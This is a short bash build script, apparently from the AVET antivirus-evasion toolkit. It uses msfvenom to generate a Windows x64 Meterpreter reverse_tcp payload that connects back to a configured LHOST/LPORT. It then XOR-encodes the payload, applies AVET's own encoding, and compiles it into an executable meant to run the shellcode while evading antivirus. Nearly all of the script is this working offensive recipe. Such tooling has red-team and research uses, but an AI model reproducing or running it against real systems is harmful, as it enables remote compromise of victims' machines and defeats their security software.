#!/bin/bash    
# example script for building executables with 64bit payload

# include script containing the compiler var $win64_compiler
# you can edit the compiler in build/global_win64.sh
# or enter $win64_compiler="mycompiler" here
. build/global_win64.sh

# import feature construction interface
. build/feature_construction.sh

# import global default lhost and lport values from build/global_connect_config.sh
. build/global_connect_config.sh

# override connect-back settings here, if necessary
LPORT=$GLOBAL_LPORT
LHOST=$GLOBAL_LHOST

# make meterpreter reverse payload
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x64/xor -f c --platform Windows > input/sc.txt

# Apply AVET encoding via format.sh tool
./tools/format.sh input/sc.txt > input/scclean.txt

# set shellcode source
set_shellcode_source static_from_file input/scclean.txt

# set decoder and key source
# AVET decoder requires no key
set_decoder avet
set_key_source none

# set shellcode binding technique
set_shellcode_binding exec_shellcode64

# enable debug output
enable_debug_print

# call make_avet, compile 
$win64_compiler -o output/output.exe source/avet.c
strip output/output.exe

# cleanup
rm input/sc.txt
rm input/scclean.txt
cleanup_techniques
